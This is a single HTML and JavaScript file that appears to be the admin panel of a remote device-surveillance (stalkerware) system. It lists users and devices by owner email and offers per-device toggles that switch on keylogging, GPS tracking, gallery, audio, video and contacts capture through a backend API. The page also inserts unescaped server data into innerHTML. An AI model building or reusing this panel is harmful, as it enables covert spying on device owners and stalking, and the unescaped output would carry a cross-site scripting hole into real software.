<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background:#0a0808; color:#eee; font-family: Arial; padding:20px; }
        table { border-collapse: collapse; width:100%; margin-top:20px; }
        th, td { border:1px solid #333; padding:8px; text-align:left; }
        th { background:#1a1214; }
        .toggle-btn { padding:5px 10px; cursor:pointer; border:none; border-radius:4px; }
        .enabled { background:#35c76a; color:white; }
        .disabled { background:#555; color:white; }
    </style>
</head>
<body>
    <h1>Admin Dashboard</h1>
    <button onclick="loadUsers()">Reload Users</button>
    <button onclick="loadDevices()">Reload Devices</button>

    <h2>Users</h2>
    <div id="usersList"></div>

    <h2>Devices & Feature Control</h2>
    <div id="devicesList"></div>

    <script>
        async function loadUsers() {
            const res = await fetch('/api/admin/users');
            const data = await res.json();
            document.getElementById("usersList").innerHTML = data.users.map(u => 
                `<div style="margin:5px 0;">${u.email} (${u.role})</div>`
            ).join('');
        }

        async function loadDevices() {
            const res = await fetch('/api/admin/devices');
            const data = await res.json();
            const container = document.getElementById("devicesList");
            container.innerHTML = '';
            for (const d of data.devices) {
                const features = ['gps','gallery','keylogger','audio','video','contacts'];
                const featureToggles = features.map(f => `
                    <td>
                        <button class="toggle-btn ${d[f] ? 'enabled' : 'disabled'}" 
                                onclick="toggleFeature('${d.device_id}', '${f}', ${!d[f]})">
                            ${d[f] ? 'ON' : 'OFF'}
                        </button>
                    </td>
                `).join('');
                container.innerHTML += `
                    <table style="margin-bottom:20px;">
                        <tr>
                            <th>Device ID</th><td>${d.device_id}</td>
                            <th>Owner</th><td>${d.owner_email}</td>
                        </tr>
                        <tr>
                            ${featureToggles}
                        </tr>
                    </table>
                `;
            }
        }

        async function toggleFeature(deviceId, feature, enabled) {
            const res = await fetch('/api/admin/device-feature', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId, feature, enabled })
            });
            if (res.ok) loadDevices();
            else alert('Failed to update feature.');
        }

        loadUsers();
        loadDevices();
    </script>
</body>
</html>
